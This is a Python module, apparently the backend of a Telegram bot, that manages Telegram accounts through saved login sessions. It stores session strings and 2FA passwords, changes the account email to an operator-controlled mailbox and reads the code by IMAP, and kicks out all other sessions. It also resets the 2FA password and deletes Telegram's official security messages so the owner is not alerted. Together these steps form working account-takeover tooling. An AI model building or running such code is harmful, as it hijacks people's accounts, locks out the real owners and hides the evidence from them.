# session_manager.py — النسخة المدمجة والمصححة
import asyncio
import re
import imaplib
import email as email_lib
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError,
    FloodWaitError, PhoneNumberBannedError, AuthKeyUnregisteredError
)
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
import database
from config import API_ID, API_HASH, EMAIL_USER, EMAIL_PASS, IMAP_SERVER

# ──────────────────────────────────────────
# حالة الجلسات المعلقة
# ──────────────────────────────────────────
pending_clients: dict = {}


# ──────────────────────────────────────────
# تسجيل الدخول
# ──────────────────────────────────────────
async def request_code(user_id: int, phone: str) -> dict:
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        pending_clients[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
        }
        return {"success": True}
    except PhoneNumberBannedError:
        return {"success": False, "error": "banned"}
    except FloodWaitError as e:
        return {"success": False, "error": f"flood:{e.seconds}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def submit_code(user_id: int, code: str) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        await database.save_session(phone, username, full_name, session_string)
        del pending_clients[user_id]
        await client.disconnect()
        return {"success": True, "two_fa": False}
    except SessionPasswordNeededError:
        return {"success": True, "two_fa": True}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"success": False, "error": "wrong_code"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def submit_2fa(user_id: int, password: str) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        await database.save_session(phone, username, full_name, session_string, password)
        del pending_clients[user_id]
        await client.disconnect()
        return {"success": True}
    except PasswordHashInvalidError:
        return {"success": False, "error": "wrong_2fa"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ──────────────────────────────────────────
# إدارة الجلسات النشطة
# ──────────────────────────────────────────
async def get_active_client(phone: str):
    """
    يعيد TelegramClient نشطاً أو None.

    إصلاح: استبدال `except (AuthKeyUnregisteredError, Exception)` بـ
    except منفصلَين حتى يمكن التمييز بين خطأ المفتاح وبقية الأخطاء،
    وتفادي إخفاء الاستثناء الأصلي بشكل صامت.
    """
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            await database.mark_session_invalid(phone)
            await client.disconnect()
            return None
        return client
    except AuthKeyUnregisteredError:
        # المفتاح غير مسجل — الجلسة منتهية بشكل نهائي
        await database.mark_session_invalid(phone)
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None
    except Exception:
        # أي خطأ آخر (شبكة، توقف مؤقت...)
        await database.mark_session_invalid(phone)
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


async def check_session_valid(phone: str) -> bool:
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return False
    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        authorized = await client.is_user_authorized()
        await client.disconnect()
        if not authorized:
            await database.mark_session_invalid(phone)
        return authorized
    except Exception:
        await database.mark_session_invalid(phone)
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return False


# ──────────────────────────────────────────
# تعديل الحساب
# ──────────────────────────────────────────
async def change_username(phone: str, new_username: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateUsernameRequest(new_username))
        await database.update_session_username(phone, new_username)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def change_name(phone: str, first_name: str, last_name: str = "") -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateProfileRequest(first_name=first_name, last_name=last_name))
        full_name = f"{first_name} {last_name}".strip()
        await database.update_session_fullname(phone, full_name)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def terminate_other_sessions(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        from telethon.tl.functions.auth import ResetAuthorizationsRequest
        await client(ResetAuthorizationsRequest())
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def set_two_fa(
    phone: str, new_password: str, old_password: str = None
) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(
            current_password=old_password,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def remove_two_fa(phone: str, current_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(current_password=current_password, new_password=None)
        await database.update_session_two_fa(phone, None)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# تغيير البريد الإلكتروني (IMAP)
# ──────────────────────────────────────────
def _fetch_code_blocking(target_email: str) -> str | None:
    """
    دالة blocking تقرأ IMAP — تُستدعى فقط عبر asyncio.to_thread
    لتفادي تجميد event loop.

    إصلاح: الفرز بـ SORT (إذا دعمه الخادم) أو أخذ آخر رسالة من قائمة
    مرتبة حسب الوقت، وإضافة فلتر UNSEEN لتجنب إعادة كود قديم.
    """
    try:
        mail = imaplib.IMAP4_SSL(IMAP_SERVER)
        mail.login(EMAIL_USER, EMAIL_PASS)
        mail.select("inbox")

        # فلتر: رسائل غير مقروءة موجهة للبريد المستهدف
        _, messages = mail.search(None, f'UNSEEN TO "{target_email}"')
        ids = messages[0].split() if messages[0] else []

        # إذا لم توجد رسائل غير مقروءة، نجرب الكل (fallback)
        if not ids:
            _, messages = mail.search(None, f'TO "{target_email}"')
            ids = messages[0].split() if messages[0] else []

        if ids:
            # آخر رسالة في القائمة هي الأحدث
            latest_id = ids[-1]
            _, data = mail.fetch(latest_id, "(RFC822)")
            msg = email_lib.message_from_bytes(data[0][1])
            content = str(msg)
            match = (
                re.search(r'code[:\s]+(\d{5,6})', content, re.IGNORECASE)
                or re.search(r'\b(\d{5,6})\b', content)
            )
            if match:
                mail.logout()
                return match.group(1)

        mail.logout()
    except Exception:
        pass
    return None


async def fetch_code_from_email(
    target_email: str, attempts: int = 12, interval: int = 5
) -> str | None:
    """
    يحاول قراءة كود التليجرام من الإيميل لمدة attempts * interval ثانية.
    يستخدم asyncio.to_thread لتشغيل IMAP بدون تجميد event loop.
    """
    for _ in range(attempts):
        await asyncio.sleep(interval)
        code = await asyncio.to_thread(_fetch_code_blocking, target_email)
        if code:
            return code
    return None


async def change_email_auto(phone: str, new_email: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}
    try:
        await client(functions.account.UpdateEmailRequest(email=new_email))
        code = await fetch_code_from_email(new_email)
        if not code:
            return {"success": False, "error": "لم يتم العثور على الكود في الإيميل"}
        await client(functions.account.ConfirmEmailRequest(code=code))
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# تنظيف شامل
# ──────────────────────────────────────────
async def full_clean_and_kick(phone: str, new_password: str) -> dict:
    """
    1. طرد جميع الجلسات الأخرى
    2. تغيير كلمة المرور
    3. حذف رسائل تيليغرام الرسمية
    """
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}
    try:
        # 1. طرد جميع الجلسات الأخرى
        await client(functions.auth.ResetAuthorizationsRequest())

        # 2. تغيير كلمة المرور
        session = await database.get_session_by_phone(phone)
        current_password = session["two_fa"] if session and session.get("two_fa") else None
        await client.edit_2fa(
            current_password=current_password,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)

        # 3. حذف رسائل تيليغرام الرسمية
        msgs = await client.get_messages(777000, limit=50)
        if msgs:
            await client.delete_messages(777000, msgs)

        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# مراقبة كود تسجيل الدخول (من الرسائل)
# ──────────────────────────────────────────
CODE_PATTERN = re.compile(r'\b\d{5}\b')


async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
    """
    يراقب الرسائل الواردة من 777000 و 42777 بحثاً عن كود 5 أرقام.
    يعيد نص الرسالة أو None عند انتهاء المهلة.

    إصلاح: استبدال asyncio.get_event_loop() المهجور بـ asyncio.get_running_loop()
    (get_event_loop يرفع DeprecationWarning في Python 3.10+ ويُعطي نتائج
    غير متوقعة إذا استُدعيت من خارج coroutine نشط).
    """
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return None

    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        # لقطة للرسائل الحالية لتجنب إعادة كود قديم
        snapshot = {}
        for sender_id in [777000, 42777]:
            try:
                msgs = await client.get_messages(sender_id, limit=1)
                snapshot[sender_id] = msgs[0].id if msgs else 0
            except Exception:
                snapshot[sender_id] = 0

        # إصلاح: استخدام get_running_loop بدلاً من get_event_loop
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout

        while loop.time() < deadline:
            await asyncio.sleep(3)
            for sender_id, last_id in list(snapshot.items()):
                try:
                    new_msgs = await client.get_messages(sender_id, limit=5)
                    for msg in new_msgs:
                        if msg.id > last_id and msg.text and CODE_PATTERN.search(msg.text):
                            await client.disconnect()
                            return msg.text
                    if new_msgs:
                        snapshot[sender_id] = max(last_id, new_msgs[0].id)
                except Exception:
                    pass

        await client.disconnect()
        return None

    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None
